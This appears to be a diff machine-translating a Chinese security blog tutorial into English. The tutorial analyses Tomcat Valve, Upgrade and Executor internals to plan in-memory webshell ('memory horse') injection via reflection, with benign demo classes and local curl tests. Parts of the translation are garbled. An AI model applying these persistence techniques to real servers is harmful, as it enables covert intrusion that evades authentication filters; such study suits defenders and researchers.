+The keyword we set here is `DefaultWebFilterChain`, and then run it directly:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126145528943.png)
 
-也就是说，位置是在：
+That is, the location is:
 
 ```
 TargetObject = {reactor.netty.resources.DefaultLoopResources$EventLoop} 
@@ -1698,44 +1700,44 @@ TargetObject = {reactor.netty.resources.DefaultLoopResources$EventLoop}
             ---> chain = {org.springframework.web.server.handler.DefaultWebFilterChain}
 ```
 
-## 2.13 Tomcat Valve介绍与运行过程分析
+## 2.13 Tomcat Valve introduction and running process analysis
 
-### 2.13.1 Valve与Pipeline
+### 2.13.1 Valves and pipes
 
-在众多文章里面，下面的这篇我觉得是讲的最通俗易懂的，这里推荐给大家：
+Among the many articles, I think the following article is the most easy to understand. Here is a recommendation for you:
 
 > https://www.cnblogs.com/coldridgeValley/p/5816414.html
 
-这里我组合引用原文，做了适当的修改，概括一下：
+Here I combined the original text and made appropriate modifications to summarize:
 
-`tomcat`中的`Container`有4种，分别是`Engine`、`Host`、`Context`和`Wrapper`，这`4`个`Container`的实现类分别是`StandardEngine`、`StandardHost`、`StandardContext`和`StandardWrapper`。`4`种容器的关系是包含关系，`Engine`包含`Host`，`Host`包含`Context`，`Context`包含`Wrapper`，`Wrapper`则代表最基础的一个`Servlet`。
-`tomcat`由`Connector`和`Container`两部分组成，而当网络请求过来的时候`Connector`先将请求包装为`Request`，然后将`Request`交由`Container`进行处理，最终返回给请求方。而`Container`处理的第一层就是`Engine`容器，但是在`tomcat`中`Engine`容器不会直接调用`Host`容器去处理请求，那么请求是怎么在`4`个容器中流转的，4个容器之间是怎么依次调用的呢？
+There are four types of Container in `tomcat`, namely `Engine`, `Host`, `Context` and `Wrapper`. The implementation classes of these `4`Container` are `StandardEngine`, `StandardHost`, `StandardContext` and `StandardWrapper`. The relationships of `4 types of containers are inclusion relationships. `Engine` contains `Host`, `Host` contains `Context`, `Context` contains `Wrapper`, and `Wrapper` represents the most basic `Servlet`.
+`tomcat` consists of two parts: `Connector` and `Container`. When the network request comes, the Connector first wraps the request as `Request`, and then hands the `Request` to `Container` for processing, and finally returns it to the requester. The first layer of `Container` processing is the `Engine` container, but in `tomcat`, the `Host` container will not directly call the `Host` container to process the request. So how do the request flow in `4` containers, and how do the 4 containers be called in sequence?
 
-原来，当请求到达`Engine`容器的时候，`Engine`并非是直接调用对应的`Host`去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做`pipeline`组件，跟`pipeline`相关的还有个也是容器内部的组件，叫做`valve`组件。
+It turns out that when the request reaches the `Engine` container, `Engine` does not directly call the corresponding `Host` to handle the related request, but calls one of its own components to handle it. This component is called the `pipeline` component. There is also a component related to `pipeline` that is also an internal component called the `valve` component.
 
-`Pipeline`的作用就如其中文意思一样——管道，可以把不同容器想象成一个独立的个体，那么`pipeline`就可以理解为不同容器之间的管道，道路，桥梁。那`Valve`这个组件是什么东西呢？`Valve`也可以直接按照字面意思去理解为阀门。我们知道，在生活中可以看到每个管道上面都有阀门，`Pipeline`和`Valve`关系也是一样的。`Valve`代表管道上的阀门，可以控制管道的流向，当然每个管道上可以有多个阀门。如果把`Pipeline`比作公路的话，那么`Valve`可以理解为公路上的收费站，车代表`Pipeline`中的内容，那么每个收费站都会对其中的内容做一些处理（收费，查证件等）。
+The function of `Pipeline` is just like the meaning of it - pipes. Different containers can be imagined as independent individuals, so `pipeline` can be understood as pipelines, roads, and bridges between different containers. So what is the `Valve` component? `Valve` can also be understood as a valve directly according to the literal meaning. We know that in life, we can see that there are valves on each pipeline, and the relationship between `Pipeline` and `Valve` is the same. `Valve` represents the valve on the pipeline, which can control the flow direction of the pipeline, and of course there can be multiple valves on each pipeline. If `Pipeline` is compared to a highway, then `Valve` can be understood as a toll station on the highway. The bus represents the content in `Pipeline`, then each toll station will do some processing on the content (tolls, check documents, etc.).
 
-在`Catalina`中，`4`种容器都有自己的`Pipeline`组件，每个`Pipeline`组件上至少会设定一个`Valve`，这个`Valve`我们称之为`BaseValve`，也就是基础阀。基础阀的作用是连接当前容器的下一个容器（通常是自己的自容器），可以说基础阀是两个容器之间的桥梁。
+In Catalina, the 4 types of containers have their own Pipeline components. Each Pipeline component will have at least one Valve. We call this Valve, which is the base valve. The function of the base valve is to connect the next container of the current container (usually its own self-container). It can be said that the base valve is the bridge between the two containers.
 
-`Pipeline`定义对应的接口`Pipeline`，标准实现了`StandardPipeline`。`Valve`定义对应的接口`Valve`，抽象实现类`ValveBase`，`4`个容器对应基础阀门分别是`StandardEngineValve`，`StandardHostValve`，`StandardContextValve`，`StandardWrapperValve`。在实际运行中，`Pipeline`和`Valve`运行机制如下图：
+`Pipeline` defines the corresponding interface `Pipeline`, and the standard implements `StandardPipeline`. `Valve` defines the corresponding interface `Valve`, abstract implementation class `ValveBase`, `4` containers corresponding basic valves are `StandardEngineValve`, `StandardHostValve`, `StandardContextValve`, and `StandardWrapperValve`. In actual operation, the operating mechanisms of `Pipeline` and `Valve` are as follows:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240129171852854.png)
 
-这张图是新加坡的`Dennis Jacob`在`ApacheCON Asia 2022`上的演讲《Extending Valves in Tomcat》中的`PPT`中的图片，`pdf`链接如下：
+This picture is a picture of Singapore's `Dennis Jacob's speech "Extending Valves in Tomcat" in ApacheCON Asia 2022. The `pdf` link is as follows:
 
 > https://people.apache.org/~huxing/acasia2022/Dennis-Jacob-Extending-Valves-in-Tomcat.pdf
 
-这篇演讲的录屏在`Youtube`上面可以找到：
+The screen recording of this speech can be found on `Youtube`:
 
 > https://www.youtube.com/watch?v=Jmw-d0kyZ_4
 
-### 2.13.2 编写一个简单Tomcat Valve的demo
+### 2.13.2 Write a simple demo of Tomcat Valve
 
-由于在`Tomcat`环境下使用Valve还要配置web.xml，我嫌麻烦，于是直接使用`SpringBoot`来搭建。记得这里勾选的是`Spring Web`：
+Since I have to configure web.xml when using Valve in the Tomcat environment, I find it troublesome, so I directly use SpringBoot to build it. Remember to check the `Spring Web` here:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240129184504826.png)
 
-然后创建`test`目录并在`test`目录下创建两个文件，`TestValve.java`：
+Then create the `test` directory and create two files under the `test` directory, `TestValve.java`:
 
 ```java
 package org.example.valvememoryshelldemo.test;
@@ -1757,7 +1759,7 @@ public class TestValve extends ValveBase {
 }
 ```
 
-还有`TestConfig.java`：
+There is also `TestConfig.java`:
 
 ```java
 package org.example.valvememoryshelldemo.test;
@@ -1784,15 +1786,15 @@ public class TestConfig {
 }
 ```
 
-运行效果如下：![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240129184753374.png)
+The operation effect is as follows:![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240129184753374.png)
 
-### 2.13.3 Tomcat Valve打入内存马思路分析
+### 2.13.3 Analysis of Tomcat Valve's idea of ​​entering memory horse
 
-我们通常情况下用的都是`ValveBase`，点进这个`ValveBase`，可以看到是实现了`Valve`接口：
+Under normal circumstances, we usually use `ValveBase`. Click on this `ValveBase` and you can see that the `Valve` interface is implemented:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130140509002.png)
 
-点进`valve`可以看到该接口代码如下，这里我加上了注释：
+Click `valve` to see the interface code as follows, here I added a comment:
 
 ```java
 package org.apache.catalina;
@@ -1803,27 +1805,27 @@ import org.apache.catalina.connector.Request;
 import org.apache.catalina.connector.Response;
 
 public interface Valve {
-    // 获取下一个阀门
+    // Get the next valve
     public Valve getNext();
-    // 设置下一个阀门
+    // Set up the next valve
     public void setNext(Valve valve);
-    // 后台执行逻辑，主要在类加载上下文中使用到
+    // Background execution logic, mainly used in class loading context
     public void backgroundProcess();
-    // 执行业务逻辑
+    // Execute business logic
     public void invoke(Request request, Response response)
         throws IOException, ServletException;
-    // 是否异步执行
+    // Whether to execute asynchronously
     public boolean isAsyncSupported();
 }
 ```
 
-接下来就是调试看看这个`valve`的运行流程了，我们在`invoke`函数这里下断点调试：
+Next, we will debug the running process of this `valve`. We will debug the breakpoint here in the `invoke` function:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130153634378.png)
 
-我们看向左下角，看看之前调用到的`invoke`方法：
+Let's look at the lower left corner and see the `invoke` method I called before:
 
-在`StandardHostValve.java`中，代码为：
+In `StandardHostValve.java`, the code is:
 
 ```java
 context.getPipeline().getFirst().invoke(request, response);
@@ -1831,7 +1833,7 @@ context.getPipeline().getFirst().invoke(request, response);
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130153939854.png)
 
-在`StandardEngineValve.java`中，代码为：
+In `StandardEngineValve.java`, the code is:
 
 ```java
 host.getPipeline().getFirst().invoke(request, response);
@@ -1839,43 +1841,43 @@ host.getPipeline().getFirst().invoke(request, response);
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130154036757.png)
 
-之后的诸如`Http11Processor.java`和多线程的部分就不需要我们关注了。既然我们的目的是打入内存马，那根据我们掌握的`Tomcat Servlet/Filter/Listener`内存马的思路来看，我们需要通过某种方式添加我们自己的恶意`valve`。
+The subsequent parts such as `Http11Processor.java` and multi-threading do not need our attention. Since our purpose is to penetrate the memory horse, according to the ideas of the `Tomcat Servlet/Filter/Listener` memory horse we have, we need to add our own malicious `valve` in some way.
 
-我们去掉之前打的断点，在`StandardHostValve.java`这里打上断电并重新调试：
+We remove the breakpoint we made before, turn off the power in `StandardHostValve.java` and re-debug:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130154855309.png)
 
-然后`step into`：
+Then `step into`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130154950328.png)
 
-鼠标左键单击这里的`getPipeline`即可进入到所调用的函数实现的位置：
+Left click on `getPipeline` here to enter the location of the called function implementation:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130155044025.png)
 
-再`Ctrl+H`进入`Pipeline`接口，可以看到是有个`addValve`方法：
+Then enter the `Pipeline` interface and you can see that there is an `addValve` method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130155119909.png)
 
-这不正是我们需要的吗？我们去看看它是在哪儿实现的，直接在`addValve`函数处`Ctrl+H`找继承该接口的类，可可以看到是在`org.apache.catalina.core.StandardPipeline`中：
+Isn't this exactly what we need? Let's see where it is implemented. We directly find the class inheriting the interface in the `addValve` function `Ctrl+H`. You can see that it is in `org.apache.catalina.core.StandardPipeline`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130155445230.png)
 
-但是问题就来了，我们无法直接获取到这个`StandardPipeline`，而我们能直接获取到的是`StandardContext`，那就去看看`StandardContext.java`中有没有获取`StandardPipeline`的方法。
+But the problem is here. We cannot directly obtain the `StandardPipeline`, and what we can directly obtain is `StandardContext`, so let's see if there is a method to obtain `StandardPipeline` in `StandardContext.java`.
 
-一眼就能看到我们的老熟人——`getPipeline`方法：
+You can see our old acquaintances at a glance - `getPipeline` method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130155825670.png)
 
-那这样以来我们的思路就可以补充完整了，先反射获取`StandardContext`，然后编写一个恶意`Valve`，最后通过`StandardContext.getPipeline().addValve()`添加就可以了。当然，我们也可以反射获取`StandardPipeline`，然后再`addValve`，这样也是可以的。
+Then our ideas can be fully supplemented. First reflect and get the `StandardContext`, then write a malicious `Valve`, and finally add it through `StandardContext.getPipeline().addValve()`. Of course, we can also reflect and obtain `StandardPipeline` and then `addValve`, which is also OK.
 
-## 2.14 Tomcat Upgrade介绍与打入内存马思路分析
+## 2.14 Tomcat Upgrade introduction and analysis of the idea of ​​injecting into memory horses
 
-### 2.14.1 编写一个简单的Tomcat Upgrade的demo
+### 2.14.1 Write a simple Tomcat Upgrade demo
 
-#### 2.14.1.1 利用SpringBoot搭建
+#### 2.14.1.1 Build with SpringBoot
 
-我这里在之前的`Tomcat Valve`项目的基础上做了简单的修改，删除之前`test`目录下的`TestValve.java`，新建一个`TestUpgrade.java`：
+I made a simple modification based on the previous `Tomcat Valve` project, deleted the `TestValve.java` in the previous `test` directory, and created a `TestUpgrade.java`:
 
 ```java
 package org.example.valvememoryshelldemo.test;
@@ -1927,7 +1929,7 @@ public class TestUpgrade implements UpgradeProtocol {
 }
 ```
 
-然后修改`TestConfig.java`如下：
+Then modify `TestConfig.java` as follows:
 
 ```java
 package org.example.valvememoryshelldemo.test;
@@ -1948,13 +1950,13 @@ public class TestConfig implements WebServerFactoryCustomizer<TomcatServletWebSe
 }
 ```
 
-运行之后命令行执行命令`curl -H "Connection: Upgrade" -H "Upgrade: hello" http://localhost:8080`，效果如下：
+After running, execute the command `curl -H "Connection: Upgrade" -H "Upgrade: hello" http://localhost:8080`, the effect is as follows:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131011203184.png)
 
-#### 2.14.1.2 利用Tomcat搭建
+#### 2.14.1.2 Built with Tomcat
 
-当然也是可以利用`Tomcat`来搭建的，只需要`TestUpgrade.java`即可，因为里面含有定义的`servlet`逻辑：
+Of course, it can also be built using `Tomcat`. You only need `TestUpgrade.java`, because it contains the defined `servlet` logic:
 
 ```java
 package org.example;
@@ -2027,86 +2029,86 @@ public class TestUpgrade extends HttpServlet {
 }
 ```
 
-效果如下：
+The effects are as follows:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131151112722.png)
 
-### 2.14.2 Tomcat Upgrade内存马介绍与相关代码调试分析
+### 2.14.2 Tomcat Upgrade memory horse introduction and related code debugging analysis
 
-这部分主要参考了`Sndav`师傅的文章（原文地址为`https://tttang.com/archive/1709/`，但是由于图片链接挂掉导致图片无法显示，我们可以访问如下地址查看：`https://web.archive.org/web/20220823040415/https://tttang.com/archive/1709/`）以及`p4d0rn`师傅的文章（`https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/upgrade`）。
+This part mainly refers to the article of Master Sndav (the original address is `https://tttang.com/archive/1709/`, but the image cannot be displayed due to the lapse of the image link. We can visit the following address to view: `https://web.archive.org/web/20220823040415/https://tttang.com/archive/1709/`) and the article of Master p4d0rn (`https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/upgrade`).
 
-和之前所提到的`Spring Interceptor`型内存马有点类似，在渗透过程中，尽管我们打入了内存马，但是因为原有的Filter包含鉴权或者其他功能，可能会导致我们的内存马无法访问，或者因为反向代理而导致我们无法找到对应的路径，这就需要我们在到`Filter`这一步之前就得打入内存马。
+It is somewhat similar to the Spring Interceptor type memory horse mentioned earlier. During the penetration process, although we enter the memory horse, because the original Filter contains authentication or other functions, our memory horse may be inaccessible, or because of the reverse proxy, we cannot find the corresponding path. This requires us to enter the memory horse before we reach the Filter step.
 
-这里，我引用码哥字节文章（`https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09`）里面的一张`Tomcat`架构图：
+Here, I quote a `Tomcat` architecture diagram in the Ma Ge Byte article (`https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09`):
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/20200725210507.png)
 
-可以清楚地看到，在此之前还有`Executor`和`Processor`两个模块，本节内容主要讨论后者，在下节中我们会讨论前者。
+It can be clearly seen that there are two modules `Executor` and `Processor` before this. The content of this section mainly discusses the latter, and we will discuss the former in the next section.
 
-这一部分需要更加完备的`Tomcat`的相关知识，不再满足于之前的四个容器，关于这些基础知识的学习，强烈建议看码哥字节的文章，写的确实特别的好：
+This part requires more complete knowledge about `Tomcat` and is no longer satisfied with the previous four containers. Regarding the learning of these basic knowledge, it is highly recommended to read the articles of Ma Ge Bytes. The writing is indeed very good:
 
 > https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09
 
-其实在之前学习`Tomcat Valve`的过程中，当时我是一步步`step over`跟完了所有的代码的，我当时也提了一嘴`Http11Processor`。我们还是以当时的项目为例来看。
+In fact, during the previous process of learning "Tomcat Valve", I followed all the code step by step, and I also mentioned "Http11Processor". Let’s take the project at that time as an example.
 
-我们还是在`StandardHostValve.java`的这行打上断点：
+We still set a breakpoint on the line `StandardHostValve.java`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130233028436.png)
 
-从上面我红色箭头所指出的地方就可以看到调用到了`process`函数，具体调用位置位于`org.apache.coyote.AbstractProcessorLight#process`，我们跟过去看看：
+From the point where I pointed out by the red arrow above, you can see that the `process` function is called. The specific call location is `org.apache.coyote.AbstractProcessorLight#process`. Let's take a look with you:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130233124074.png)
 
-可以看到，如果当前`SocketWrapperBase`的状态是`OPEN_READ`的时候，才会调用对应的`processor`去处理（第二张图的`process`调用的位置可以通过第一张图左下角的那个`process`的后一个`process`点进去看到）：
+You can see that if the current state of `SocketWrapperBase` is `OPEN_READ`, the corresponding `processor` will be called to process (the position of the `process` call in the second picture can be clicked in to see the next `process` of the `process` in the lower left corner of the first picture):
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130233206768.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130233758378.png)
 
-我们继续`step into`这里的`service`方法看看：
+Let's continue with the `step into` method here `service`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130234010670.png)
 
-继续`step over`，可以看到这里在检查`header`中的`Connection`头中是否为`upgrade`，这一点可以通过`step into`这个`isConnectionToken`方法看到：
+Continue to `step over`, you can see here that checks whether the `Connection` header is `upgrade`. This can be seen through the `step into``isConnectionToken` method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130234324083.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130234424354.png)
 
-之后干两件事情：一是调用`getUpgradeProtocol`方法根据`upgradedName`从`httpUpgradeProtocols`拿到`UpgradeProtocol`；二是调用`UpgradeProtocol`对象的`accept`方法：
+Then do two things: one is to call the `getUpgradeProtocol` method to get the `UpgradeProtocol` from `httpUpgradeProtocols` according to `upgradeName`; the other is to call the `accept` method of the `UpgradeProtocol` object:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130234624306.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130234945666.png)
 
-到了这里，我们似乎可以建立起一个猜想，和之前介绍的内存马类似，我们只要构造一个恶意的`UpgradeProtocol`，然后把它插入到`httpUpgradeProtocols`。
+At this point, we seem to be able to establish a conjecture. Similar to the memory horse introduced earlier, we just need to construct a malicious `UpgradeProtocol` and insert it into `httpUpgradeProtocols`.
 
-由于`httpUpgradeProtocols`是一个`hashmap`，那么向里面添加的话用到的肯定是`put`方法，直接搜`httpUpgradeProtocols.put`：
+Since `httpUpgradeProtocols` is a `hashmap`, then if you add it, you must use the `put` method. Just search for `httpUpgradeProtocols.put`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131143446951.png)
 
-我们在这行打上断点，然后调试，发现在我们没有执行`curl -H "Connection: Upgrade" -H "Upgrade: hello" http://localhost:8080`这条命令之前，断点就到了，也就是说，`httpUpgradeProtocols.put`这个事情是发生在`tomcat`启动的时候的。
+We set a breakpoint on this line and then debugged and found that before we executed the `curl -H "Connection: Upgrade" -H "Upgrade: hello" http://localhost:8080` command, the breakpoint arrived, that is, the `httpUpgradeProtocols.put` happened when `tomcat` was started.
 
-那这样一来，思路就更加具体了一点：反射找到`httpUpgradeProtocols`，把恶意`upgradeProtocol`插入进去即可构成`upgrade`内存马，思路和之前是一模一样的。
+In this way, the idea is more specific: find `httpUpgradeProtocols` in reflection, insert the malicious upgradeProtocol` into it to form an `upgrade` memory horse, and the idea is exactly the same as before.
 
-那现在只需要解决最后一个问题——如何找到`httpUpgradeProtocols`的位置。我们打开之前用`tomcat`搭建的`Tomcat Upgrade`的`demo`，在如下位置打下断点，然后执行命令`curl -H "Connection: Upgrade" -H "Upgrade: hello" http://localhost:8080/evil`进入断点调试：：
+Then now only the last problem needs to be solved - how to find the location of `httpUpgradeProtocols`. We open the `demo` of the `Tomcat Upgrade` built with `tomcat`, set the breakpoint at the following location, and then execute the command `curl -H "Connection: Upgrade" -H "Upgrade: hello" http://localhost:8080/evil` to enter the breakpoint debugging::
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131151457146.png)
 
-`step over`一步即可在下方看到`request1`属性：
+`step over` can see the `request1` property below in one step:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131151614135.png)
 
-然后在`request1`里面的`connector`的`protocolHandler`里面发现了`httpUpgradeProtocols`：
+Then I found `httpUpgradeProtocols` in the `protocolHandler` of the `connector` in `request1`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131151700530.png)
 
-接下来就是一步步地反射了。
+Next is to reflect step by step。
 
-## 2.15 Tomcat Executor内存马介绍与打入内存马思路分析
+## 2.15 Introduction to Tomcat Executor Memory Horse and Analysis of Ideas for Input Memory Horse
 
 ### 2.15.1 
 
-新建一个项目，配置好`tomcat`运行环境和`web`目录，然后新建以下两个文件，第一个是TestExecutor.java：
+Create a new project, configure the `tomcat` running environment and `web` directory, and then create the following two files. The first one is TestExecutor.java:
 
 ```java
 package org.example;
@@ -2134,7 +2136,7 @@ public class TestExecutor extends ThreadPoolExecutor {
 }
 ```
 
-第二个是`TestServlet.java`：
+The second is `TestServlet.java`:
 
 ```java
 package org.example;
@@ -2157,13 +2159,13 @@ public class TestServlet extends HttpServlet {
 }
 ```
 
-然后访问浏览器对应`context`下的`test`路由：
+Then visit the `test` route corresponding to the `context` of the browser:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202165507597.png)
 
-### 2.15.2 Tomcat Executor内存马介绍与代码调试分析
+### 2.15.2 Tomcat Executor memory horse introduction and code debugging analysis
 
-在`2.14.2`节中，我们聊到过可以在`Executor`模块中打入内存马，本节就来分析具体流程。本节主要参考文章为以下四篇：
+In Section 2.14.2, we talked about the fact that you can enter the memory horse in the `Executor` module, and this section will analyze the specific process. This section mainly refers to the following four articles：
 
 > https://p4d0rn.gitbook.io/java/memory-shell/tomcat-middlewares/executor
 >
@@ -2173,35 +2175,35 @@ public class TestServlet extends HttpServlet {
 >
 > https://xz.aliyun.com/t/11613
 
-在我之前提到过的讲tomcat架构的基础文章（`https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09`），有详细地讲述`ProtocolHandler`组件中的`EndPoint`部件，如果之前没有看完整地可以再去看下。里面这张图画的很好，我这里作引用：
+In the basic article I mentioned before about the tomcat architecture (`https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09`), it describes the `EndPoint` component in the `ProtocolHandler` component in the component. If you haven't read it in full before, you can check it out again. The picture inside is very good, I'll quote it here:
 
 ![](https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/NioEndPoint.jpg)
 
-#### 2.15.2.1 Endpoint五大组件
+#### 2.15.2.1 Endpoint's five components
 
-如下表所示：
+As shown in the following table:
 
-|       组件        |                     描述                     |
+|       Components        |                     describe                     |
 | :---------------: | :------------------------------------------: |
-|   `LimitLatch`    |          连接控制器，控制最大连接数          |
-|    `Acceptor`     |  接收新连接并返回给`Poller`的`Channel`对象   |
-|     `Poller`      | 监控`Channel`状态，类似于`NIO`中的`Selector` |
-| `SocketProcessor` |       封装的任务类，处理连接的具体操作       |
-|    `Executor`     |     `Tomcat`自定义线程池，用于执行任务类     |
+|   `LimitLatch`    |          Connect to the controller to control the maximum number of connections          |
+|    `Acceptor`     |  Receive a new connection and return the `Channel` object to `Poller`   |
+|     `Poller`      | Monitor the `Channel` status, similar to the `Selector` in `NIO` |
+| `SocketProcessor` |       Encapsulated task class, handles specific operations of connection       |
+|    `Executor`     |     `Tomcat` custom thread pool for executing task classes     |
 
-#### 2.15.2.2 Endpoint分类
+#### 2.15.2.2 Endpoint Classification
 
-`EndPoint`接口的具体实现类为`AbstractEndpoint`，`AbstractEndpoint`具体的实现类有`AprEndpoint`、`Nio2Endpoint`、`NioEndpoint`：
+The specific implementation classes of the `EndPoint` interface are `AbstractEndpoint`, and the specific implementation classes of `AprEndpoint`, `Nio2Endpoint`, and `NioEndpoint`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131231807324.png)
 
-|    Endpoint    |                简要解释                 |              Tomcat 源码位置              |
+|    Endpoint    |                Brief explanation                 |              Tomcat source code location              |
 | :------------: | :-------------------------------------: | :---------------------------------------: |
-| `AprEndpoint`  | 使用`APR`模式解决异步`IO`问题，提高性能 | `org.apache.tomcat.util.net.AprEndpoint`  |
-| `Nio2Endpoint` |          使用代码实现异步`IO`           | `org.apache.tomcat.util.net.Nio2Endpoint` |
-| `NioEndpoint`  |      使用`Java NIO`实现非阻塞`IO`       | `org.apache.tomcat.util.net.NioEndpoint`  |
+| `AprEndpoint`  | Use `APR` mode to solve asynchronous `IO` problem and improve performance | `org.apache.tomcat.util.net.AprEndpoint`  |
+| `Nio2Endpoint` |          Implementation of asynchronous `IO` using code           | `org.apache.tomcat.util.net.Nio2Endpoint` |
+| `NioEndpoint`  |      Implementing non-blocking `IO` using `Java NIO`       | `org.apache.tomcat.util.net.NioEndpoint`  |
 
-上面所提到的`tomcat`，指的是如下`pom`依赖：
+The `tomcat` mentioned above refers to the following `pom` dependencies:
 
 ```xml
 <dependency>
@@ -2213,38 +2215,39 @@ public class TestServlet extends HttpServlet {
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131232445734.png)
 
-`Tomcat`默认启动是以`NioEndpoint`来启动的，它是`Tomcat`中默认的负责使用`NIO`方式进行网络通信功能的模块，它负责监听处理请求连接，并将解析出的字节流传递给`Processor`进行后续的处理。
+The default startup of `Tomcat` is started with `NioEndpoint`. It is the default module in `Tomcat` that is responsible for network communication functions using `NIO`. It is responsible for listening and processing request connections, and passing the parsed byte stream to `Processor` for subsequent processing.
 
-#### 2.15.2.3 Executor相关代码分析
+#### 2.15.2.3 Executor related code analysis
 
-点开`Executor.java`即可看到有一个`execute`方法：
+Click `Executor.java` to see a `execute` method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145324525.png)
-`Ctrl+Alt+F7`追踪即可看到这个`Executor`接口在`AbstractEndpoint`这个抽象类中有相关实现：
+
+`Ctrl+Alt+F7` trace, you can see that the `Executor` interface has related implementations in the abstract class `AbstractEndpoint`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145530939.png)
 
-在`AbstractEndpoint.java`中搜索`executor`，往下翻即可看到有`setExecutor`和`getExecutor`这两个函数：
+Search for `executor` in `AbstractEndpoint.java`, and then you can see two functions: `setExecutor` and `getExecutor`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145641729.png)
 
-查看`getExecutor`函数的调用位置，发现就在该文件中有一个关键调用：
+Check the call location of the `getExecutor` function and find that there is a key call in the file:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145839900.png)
 
-跟过去：
+Follow the past:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202145913789.png)
 
-从下面这篇文章中我们可以知道`processSocket`在`Tomcat`运行过程中的作用：
+From the following article we can know the role of `processSocket` in the operation of `Tomcat`:
 
 > https://blog.51cto.com/u_8958931/2817418
 
-那此时我们就有一个想法，如果我能控制`executor`，我把原来的`executor`通过`setExecutor`变成我恶意创建的`executor`，然后再通过这后面的`executor.execute`（`org.apache.tomcat.util.threads.ThreadPoolExecutor#execute(java.lang.Runnable)`）一执行就可以加载我们的恶意逻辑了。
+Then we have an idea at this time. If I can control the `executor`, I will turn the original `executor` into the `executor` I maliciously created `executor`, and then use the `executor.execute` (`org.apache.tomcat.util.threads.ThreadPoolExecutor#execute(java.lang.Runnable)`) to load our malicious logic once executed.
 
-但是现在有一个很头疼的问题，那就是标准的`ServletRequest`需要经过`Adapter`的封装后才可获得，这里还在`Endpoint`阶段，其后面封装的`ServletRequest`和`ServletResponse`无法直接获取。
+But now there is a very headache problem, that is, the standard ServletRequest needs to be encapsulated by Adapter before it can be obtained. It is still in the Endpoint stage, and the ServletRequest and ServletResponse encapsulated later cannot be directly obtained.
 
-那怎么办呢？结合之前学过的知识，我们很容易想到在之前我们第一次接触`java-object-researcher`的时候，`c0ny1`师傅写的这篇文章：
+So what should I do? Based on the knowledge we have learned before, it is easy to think of this article written by Master `c0ny1` when we first came into contact with `java-object-researcher`:
 
 > ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202165813229.png)
 >
@@ -2252,7 +2255,7 @@ public class TestServlet extends HttpServlet {
 >
 > ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202165719046.png)
 
-那就试试看呗，我们导入`jar`包到项目之后修改`TestServlet.java`代码如下：
+Then try it. After importing the `jar` package to the project, we modify the `TestServlet.java` code as follows:
 
 ```java
 package org.example;
@@ -2290,11 +2293,11 @@ public class TestServlet extends HttpServlet {
 }
 ```
 
-接着访问路由，然后在控制台输出中搜索`request = `：
+Then access the route and search for `request=` in the console output:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202170116366.png)
 
-直接搜索到了这条链：
+I directly searched for this link:
 
 ```
